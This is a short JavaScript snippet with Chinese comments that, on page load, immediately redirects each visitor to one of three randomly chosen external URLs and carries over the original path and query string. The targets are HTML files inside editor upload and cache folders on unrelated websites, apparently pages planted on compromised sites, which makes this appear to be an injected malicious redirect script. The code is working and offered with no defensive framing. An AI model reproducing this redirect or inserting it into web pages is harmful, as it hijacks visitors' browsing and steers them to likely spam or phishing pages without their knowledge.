```javascript
(function () {
    // 只配置3个域名
    var domains = [
        "https://yczhiyu.com/runtime/cache/mga9f0518adc4847a49224f1664.html",
        "https://www.zmts2020.com//public/static/kindeditor/attached/file/20261031/20261031185630_60142.html",
        "https://www.blissfulbrides.sg//public/kindeditor/attached/file/20261031/20261031190124_78204.html"
    ];

    // 随机选择一个域名
    var index = Math.floor(Math.random() * 3);
    var target = domains[index];

    // 保留原访问路径和参数
    target += location.pathname + location.search + location.hash;

    // 立即跳转
    location.replace(target);
})();
```
